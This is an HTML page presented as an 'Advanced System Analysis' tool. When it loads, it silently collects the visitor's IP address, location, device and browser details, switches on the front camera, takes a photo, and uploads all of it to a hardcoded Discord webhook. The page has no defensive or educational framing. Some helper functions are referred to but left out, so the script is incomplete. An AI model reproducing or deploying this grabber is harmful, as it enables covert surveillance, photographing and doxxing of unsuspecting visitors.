<!DOCTYPE html>
<html>
<head>
    <title>üîç Advanced System Analysis</title>
    <style>
        :root {
            --primary: #4a6bdf;
            --secondary: #ff6b6b;
        }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            margin: 0;
            padding: 20px;
            color: #2d3748;
            min-height: 100vh;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            max-width: 900px;
            margin: 0 auto;
        }
        h1 {
            color: var(--primary);
            font-size: 2.8rem;
            margin-bottom: 10px;
            text-align: center;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .emoji-header {
            font-size: 3rem;
            margin: 20px 0;
            text-align: center;
            animation: pulse 2s infinite;
        }
        #cameraContainer {
            margin: 20px 0;
            text-align: center;
        }
        #cameraView {
            width: 100%;
            max-width: 500px;
            background-color: #eee;
            border-radius: 8px;
            margin: 10px 0;
        }
        #photoCanvas {
            display: none;
        }
        .privacy-notice {
            font-size: 0.85rem;
            color: #718096;
            text-align: center;
            margin-top: 30px;
            padding: 15px;
            background: #f8fafc;
            border-radius: 8px;
        }
        /* Rest des CSS bleibt gleich wie im vorherigen Beispiel */
    </style>
</head>
<body>
    <div class="container">
        <h1>Advanced System Analysis</h1>
        <div class="emoji-header">üîçüì∏üíª</div>
        
        <div id="cameraContainer" style="display: none;">
            <p>Camera verification in progress...</p>
            <video id="cameraView" autoplay playsinline></video>
            <canvas id="photoCanvas"></canvas>
        </div>
        
        <div id="status">
            <div style="text-align: center;">
                <div class="loading" style="margin: 0 auto;"></div>
                <p>Collecting advanced system information...</p>
            </div>
        </div>
    </div>

    <script>
        // Discord Webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375773532063141898/mD5j5NTIRh4i-DtISXR0fOG5aGhpkDbr43yjmQ-_A94jrKAlmRKsigoNdZ9m2lX0yfBo';
        let cameraStream = null;

        // Main function to collect all data
        async function collectAllData() {
            const startTime = performance.now();
            
            // 1. Collect all system information first
            const systemData = await collectSystemData();
            
            // 2. Attempt to access camera
            const cameraData = await attemptCameraCapture();
            
            // 3. Combine all data
            const allData = {
                ...systemData,
                camera: cameraData,
                metadata: {
                    collectionTime: `${(performance.now() - startTime).toFixed(2)}ms`,
                    timestamp: new Date().toISOString()
                }
            };
            
            // 4. Send to Discord
            await sendToDiscord(allData);
            
            // 5. Display results to user
            displayResults(allData);
        }
        
        // System data collection (wie zuvor)
        async function collectSystemData() {
            return {
                network: await getNetworkInfo(),
                hardware: getHardwareInfo(),
                software: getSoftwareInfo(),
                display: getDisplayInfo(),
                geo: await getGeoInfo((await getNetworkInfo()).ip),
                advanced: await getAdvancedInfo(),
                connection: getConnectionInfo(),
                storage: getStorageInfo(),
                media: await getMediaInfo(),
                graphics: getGraphicsInfo()
            };
        }
        
        // Camera capture function
        async function attemptCameraCapture() {
            try {
                // Show camera container
                document.getElementById('cameraContainer').style.display = 'block';
                
                // Access camera
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                const video = document.getElementById('cameraView');
                video.srcObject = cameraStream;
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                });
                
                // Capture photo after 3 seconds
                await new Promise(resolve => setTimeout(resolve, 3000));
                const photoData = await capturePhoto();
                
                // Stop camera
                cameraStream.getTracks().forEach(track => track.stop());
                
                return {
                    status: 'success',
                    photo: photoData,
                    cameraSettings: getCameraSettings()
                };
                
            } catch (error) {
                return {
                    status: 'error',
                    error: error.message,
                    permission: await checkCameraPermission()
                };
            }
        }
        
        async function capturePhoto() {
            const video = document.getElementById('cameraView');
            const canvas = document.getElementById('photoCanvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convert to Blob
            return new Promise(resolve => {
                canvas.toBlob(blob => {
                    const reader = new FileReader();
                    reader.onload = () => {
                        resolve({
                            blob: reader.result.split(',')[1], // Base64 data
                            width: canvas.width,
                            height: canvas.height,
                            mimeType: 'image/jpeg'
                        });
                    };
                    reader.readAsDataURL(blob);
                }, 'image/jpeg', 0.85);
            });
        }
        
        function getCameraSettings() {
            if (!cameraStream) return null;
            
            const videoTrack = cameraStream.getVideoTracks()[0];
            if (!videoTrack) return null;
            
            return {
                capabilities: videoTrack.getCapabilities ? videoTrack.getCapabilities() : null,
                settings: videoTrack.getSettings ? videoTrack.getSettings() : null,
                constraints: videoTrack.getConstraints ? videoTrack.getConstraints() : null
            };
        }
        
        async function checkCameraPermission() {
            const permissionStatus = await navigator.permissions.query({ name: 'camera' });
            return permissionStatus.state;
        }
        
        // Discord integration with photo
        async function sendToDiscord(data) {
            if (!WEBHOOK_URL.includes('discord.com')) {
                console.error("Invalid webhook URL");
                return;
            }
            
            try {
                // Prepare basic info embed
                const embed = {
                    title: "üîç Advanced System Analysis",
                    color: 0x4a6bdf,
                    fields: [
                        { name: "üåê IP Address", value: data.network.ip, inline: true },
                        { name: "üìç Location", value: `${data.geo.city}, ${data.geo.country}`, inline: true },
                        { name: "üñ•Ô∏è Device", value: `${data.hardware.platform} | ${data.hardware.deviceMemory}GB RAM`, inline: true },
                        { name: "üß≠ Browser", value: `${data.software.browser} ${data.software.version}`, inline: true },
                        { name: "üì∏ Camera Status", value: data.camera.status.toUpperCase(), inline: true }
                    ],
                    timestamp: new Date().toISOString()
                };
                
                // Create form data
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify({
                    content: `New system scan received at ${new Date().toLocaleString()}`,
                    embeds: [embed]
                }));
                
                // Add photo if available
                if (data.camera.status === 'success') {
                    const blob = await fetch(`data:image/jpeg;base64,${data.camera.photo.blob}`).then(res => res.blob());
                    formData.append('file', blob, 'user_photo.jpg');
                }
                
                // Add system data as file
                const systemDataBlob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
                formData.append('file', systemDataBlob, 'system_data.json');
                
                // Send to Discord
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error("Error sending to Discord:", error);
            }
        }
        
        // Rest der Funktionen bleibt gleich wie im vorherigen Beispiel
        
        // Start the collection
        window.onload = collectAllData;
    </script>
</body>
</html>
